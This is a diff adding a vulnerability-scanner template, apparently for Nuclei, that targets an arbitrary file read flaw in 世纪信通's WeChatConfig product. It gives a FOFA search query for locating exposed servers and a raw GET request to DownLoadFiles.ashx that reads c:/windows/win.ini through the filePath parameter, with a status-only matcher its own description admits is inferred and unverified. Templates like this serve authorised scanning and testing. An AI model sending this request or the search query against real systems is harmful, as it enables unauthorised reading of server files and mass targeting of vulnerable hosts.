@@ -1,0 +1,27 @@
+id: poc-dz46e785rcd08akm
+info:
+  name: 世纪信通WeChatConfig任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dz46e785rcd08akm
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dz46e785rcd08akm
+    fofa: '"theme/BlueCharm/" || body="广东世纪信通网络科技有限公司"'
+http:
+- raw:
+  - 'GET /WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Content-Length: 4'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
